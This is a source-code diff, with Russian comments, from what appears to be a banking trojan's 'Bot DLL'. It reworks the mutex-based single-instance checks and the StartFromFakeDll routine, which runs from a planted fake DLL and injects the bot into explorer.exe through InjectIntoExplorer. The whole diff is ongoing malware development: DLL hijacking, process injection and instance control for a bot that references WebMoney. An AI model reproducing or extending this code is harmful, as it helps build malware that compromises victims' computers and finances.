@@ -61,45 +61,6 @@ DWORD dwWebMoneySelf = 0;
 
 //DWORD dwExplorerPid  = 0; //пид эксплорера
 
-// Ф-ция для захвата мьютекса 
-// Нужна для обеспечения единственного запуска чего-либо
-bool TryToCatchHostLevelInstanceMutex(const char* MutexPrefix)
-{
-	CHAR mutex_name[200];
-
-	m_memset(mutex_name, 0, sizeof(mutex_name));
-
-	PCHAR machine_id = MakeMachineID();
-	m_lstrcat(mutex_name, "Global\\");
-	m_lstrcat(mutex_name, MutexPrefix);
-	m_lstrcat(mutex_name, machine_id);
-
-	STR::Free(machine_id);
-
-	DLLDBG("TryToCatchHostLevelInstanceMutex", "Mutex name '%s'.", mutex_name);
-
-	SECURITY_ATTRIBUTES sa;
-	SECURITY_DESCRIPTOR sd;
-
-	pInitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
-	pSetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
-
-	sa.nLength = sizeof (SECURITY_ATTRIBUTES);
-	sa.lpSecurityDescriptor = &sd;
-	sa.bInheritHandle = FALSE;
-
-	HANDLE mutex_handle = (HANDLE)pCreateMutexA(&sa, FALSE, mutex_name);
-	if (mutex_handle == NULL) return false;
-
-	// Catch ownership of mutex and never release
-	DWORD wait_result = (DWORD)pWaitForSingleObject(mutex_handle, 1000);
-	if (wait_result == WAIT_OBJECT_0) return true;
-
-	pCloseHandle(mutex_handle);
-	return false;
-}
-
-
 DWORD WINAPI LoaderRoutine(LPVOID Data)
 {
 	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");
@@ -187,8 +148,7 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 	// 401_pl запуск BotPlug
 	DebugReportStepByName("401_pl");
 
-		
-	DLLDBG("====>Bot DLL", "Стартуем Loader");
+	DLLDBG("====>Bot DLL", "Стартуем Loader ()");
 	MegaJump( LoaderRoutine );
 
 	
@@ -225,12 +185,12 @@ extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
 // Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
 DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 {
-	// Пробуем захватить мьютекс для обеспечения единственного Bot.plug
-	// в explorer
-	bool Catched = TryToCatchHostLevelInstanceMutex("bplfklexpl");
+	// Пробуем захватить мьютекс для обеспечения единственного Bot.plug в explorer
+	// при множественном запуске FakeDll
+	HANDLE ExplorerInstanceHandle = TryCreateSingleInstance("bplfklexpl");
 
-	DLLDBG("ExplorerEntryPointFromFakeDll", "TryToCatchHostLevelInstanceMutex() result=%d", Catched);
-	if (Catched == false) return 0;
+	DLLDBG("ExplorerEntryPointFromFakeDll", "ExplorerInstanceHandle=0x%X", ExplorerInstanceHandle);
+	if (ExplorerInstanceHandle == NULL) return 0;
 
 	// При загрузке просто вызывает Start, предусмотренную для
 	// обычного запуска Bot.plug
@@ -242,15 +202,23 @@ DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 BOOL WINAPI StartFromFakeDll()
 {
 	DLLDBG("StartFromFakeDll", "Started.");
+
+	// Смотрим на то - запущен ли бот
+	HANDLE BotInstanceMutex = BOT::TryCreateBotInstance();
+
+	DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
+	if (BotInstanceMutex == NULL) return FALSE;
+
+	// Если бот не запущен - закрываем мьютекс, 
+	// поскольку мы не запущены в Explorer.
+	pCloseHandle(BotInstanceMutex);
 	
-	// Пробуем захватить мьютекс для обеспечения единственного запуска StartFromFakeDll
-	// Если одновременно работает несколько процесов.
-	bool Catched = TryToCatchHostLevelInstanceMutex("bplfkl");
-	DLLDBG("StartFromFakeDll", "TryToCatchHostLevelInstanceMutex() result=%d", Catched);
+	// Пробуем захватить мьютекс для обеспечения единственного запуска FakeDll
+	// на случай, если ДЛЛ инсталирована для нескольких целевых процессов процесов.
+	HANDLE FakeDllInstanceHandle = TryCreateSingleInstance("bplfkl");
+	DLLDBG("StartFromFakeDll", "FakeDllInstanceHandle=0x%X", FakeDllInstanceHandle);
 
-	if (Catched == false) return FALSE;
+	if (FakeDllInstanceHandle == NULL) return FALSE;
 
-	InjectIntoExplorer(ExplorerEntryPointFromFakeDll);
-
-	return FALSE;
+	return (InjectIntoExplorer(ExplorerEntryPointFromFakeDll) ? TRUE : FALSE);
 }
